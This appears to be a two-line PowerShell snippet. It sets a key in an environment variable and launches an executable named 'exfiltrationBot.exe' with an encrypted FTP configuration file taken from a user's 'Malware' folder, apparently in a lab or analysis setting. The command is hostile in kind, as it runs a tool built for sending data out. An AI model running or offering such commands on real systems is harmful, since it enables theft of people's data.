$env:key = "surimi"
Start-Process -FilePath "exfiltrationBot.exe" -ArgumentList "C:\Users\CarlesCervera\Downloads\Malware\config_ftp.conf_ciph"